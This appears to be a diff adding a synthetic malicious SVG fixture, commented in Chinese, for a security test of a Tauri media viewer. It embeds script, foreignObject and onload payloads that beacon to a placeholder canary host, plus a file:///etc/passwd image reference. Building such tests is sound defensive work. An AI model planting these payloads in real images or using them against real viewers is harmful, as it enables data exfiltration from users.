@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  R09-T05 A10 合成恶意 SVG 样本（不含真实系统文件内容）。
+  模板占位符由 scripts/rust-tauri/r09_t05.py 在由测试 HTTP server 以
+  image/svg+xml 提供前替换：{{CANARY_BASE}}。
+  MediaViewer 以 <img> 渲染 SVG（ImageStage.tsx）；<img> 中的 SVG 脚本不得执行、
+  外链资源不得读取本机 file:// 或发往 canary。
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="320" height="180" viewBox="0 0 320 180">
+  <title>R09-A10 malicious SVG fixture</title>
+  <script type="text/javascript"><![CDATA[
+    // 以 <img> 加载时此脚本不得执行；若执行则会尝试 canary 外发并写 marker。
+    try {
+      var image = new Image();
+      image.src = "{{CANARY_BASE}}/svg-script-exfil";
+      parent.postMessage({ kind: "r09-a10-svg-script-ran" }, "*");
+    } catch (error) { /* expected when inert */ }
+  ]]></script>
+  <rect x="0" y="0" width="320" height="180" fill="#f4ece2"/>
+  <text x="16" y="34" font-size="18" fill="#7a2b2b">MALICIOUS-SVG-MARKER</text>
+  <image x="16" y="50" width="80" height="20" xlink:href="file:///etc/passwd"/>
+  <image x="16" y="80" width="120" height="40" href="{{CANARY_BASE}}/svg-image-exfil"/>
+  <foreignObject x="16" y="120" width="280" height="50">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script type="text/javascript"><![CDATA[new Image().src = "{{CANARY_BASE}}/svg-foreignobject-exfil";]]></script>
+      <p>FOREIGNOBJECT-MARKER</p>
+    </div>
+  </foreignObject>
+  <circle cx="280" cy="60" r="24" fill="#8a5a3b" onload="new Image().src='{{CANARY_BASE}}/svg-onload-exfil'"/>
+</svg>
